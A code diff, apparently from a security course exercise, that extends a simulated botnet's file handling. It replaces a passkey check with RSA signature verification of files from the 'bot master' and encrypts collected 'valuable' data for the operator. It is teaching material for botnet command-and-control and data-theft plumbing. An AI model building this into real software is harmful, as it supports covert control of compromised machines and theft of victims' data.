@@ -2,6 +2,7 @@ import os
 from Crypto.Cipher import PKCS1_v1_5
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA
+from botMaster.RSASignVerify import RSASignAndVerify
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
@@ -17,7 +18,7 @@ def save_valuable(data):
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
     h = SHA.new(data)
-    key = RSA.importKey(open('../PublicKeyDir.Keys/pubkeys.pem', 'r').read())
+    key = RSA.importKey(open('./PublicKeyDir.Keys/pubkeys.pem', 'rb').read())
     cipher = PKCS1_v1_5.new(key)
     ciphertext = cipher.encrypt(data+h.digest())
     return ciphertext
@@ -41,12 +42,21 @@ def verify_file(f):
     # Verify the file was sent by the bot master
     # TODO: For Part 2, you'll use public key crypto here
     # Naive verification by ensuring the first line has the "passkey"
-    lines = f.split(bytes("\n", "ascii"), 1)
-    first_line = lines[0]
-    if first_line == bytes("Caesar", "ascii"):
-        return True
-    return False
+    signature,content = extract_signature_and_content(f)
+    if signature is None:
+        return False
 
+    return RSASignAndVerify().verify_signature(content,signature)
+
+
+def extract_signature_and_content(f):
+    extracted_file = f.split(bytes("END\n","ascii"))
+
+    if len(extracted_file) > 1:
+        return extracted_file[0],extracted_file[1]
+
+    else:
+        return None,None
 def process_file(fn, f):
     if verify_file(f):
         # If it was, store it unmodified
